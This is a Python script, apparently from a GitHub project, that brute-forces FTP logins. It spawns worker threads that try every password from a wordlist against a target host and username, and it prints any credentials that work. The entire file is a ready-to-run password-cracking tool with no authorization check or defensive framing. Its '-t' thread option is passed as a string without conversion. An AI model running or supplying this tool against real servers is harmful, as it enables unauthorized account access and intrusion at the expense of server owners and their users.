#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/AniketBhunia/ftp-cracker/blob/main/ftp_cracker.py

import ftplib
from threading import Thread
import queue
from colorama import Fore, init 

# init the console for colors (for Windows)
q = queue.Queue()

# port of FTP
port = 21

def connect_ftp():
    global q
    while True:
        password = q.get()   # get the password from the queue

        server = ftplib.FTP() # initialize the FTP server object

        print("[!] Trying", password)
        try:
            server.connect(host, port, timeout=5)    # tries to connect to FTP server with a timeout of 5

            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="FTP Cracker using Python")
    parser.add_argument("host", help="The target host or IP address of the FTP server")
    parser.add_argument("-u", "--user", help="The username of target FTP server")
    parser.add_argument("-p", "--passlist", help="The path of the pass list")
    parser.add_argument("-t", "--threads", help="Number of workers to spawn for login, default is 30", default=30)

    args = parser.parse_args()
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    passlist = args.passlist
    # number of threads to spawn
    n_threads = args.threads
    # read the wordlist of passwords
    passwords = open(passlist).read().split("\n")

    print("[+] Passwords to try:", len(passwords))

    # put all passwords to the queue
    for password in passwords:
        q.put(password)

        # create `n_threads` that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()
